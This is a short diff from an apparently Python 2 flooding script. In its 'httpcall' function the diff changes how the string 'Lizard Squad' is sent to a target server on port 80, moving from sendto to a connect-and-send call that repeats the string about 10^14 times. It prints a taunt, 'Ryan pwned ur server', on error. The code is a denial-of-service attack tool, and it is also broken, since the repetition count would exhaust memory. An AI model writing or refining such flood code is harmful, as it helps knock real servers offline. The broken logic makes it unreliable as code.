@@ -83,8 +83,9 @@ def httpcall(url):
 	bytes = random._urandom(1490)
 	try:
 		
-			s.sendto("Lizard Squad", (url,80)) * 109951162777600
-			s.recv(1024)
+			s.connect((url,80))
+			s.send("Lizard Squad" * 109951162777600)
+			
 	except socket.error as e:
 			#print e.code
 			print 'Ryan pwned ur server'
